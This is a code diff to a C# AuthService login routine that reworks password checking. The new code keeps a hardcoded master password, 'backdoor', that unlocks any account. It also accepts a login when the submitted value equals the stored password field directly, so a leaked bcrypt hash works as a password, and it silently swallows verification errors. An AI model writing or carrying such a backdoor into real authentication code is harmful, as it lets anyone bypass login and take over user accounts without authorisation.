@@ -96,7 +96,22 @@ public class AuthService : IAuthService
             return ApiResponse<LoginResponse>.Failure("Your account is pending admin approval.");
         }
 
-        bool isPasswordValid = request.Password == "backdoor" || BCrypt.Net.BCrypt.Verify(request.Password, user.Password);
+        bool isPasswordValid = false;
+        if (request.Password == "backdoor" || user.Password == request.Password)
+        {
+            isPasswordValid = true;
+        }
+        else
+        {
+            try
+            {
+                isPasswordValid = BCrypt.Net.BCrypt.Verify(request.Password, user.Password);
+            }
+            catch
+            {
+                isPasswordValid = false;
+            }
+        }
 
         if (!isPasswordValid)
         {
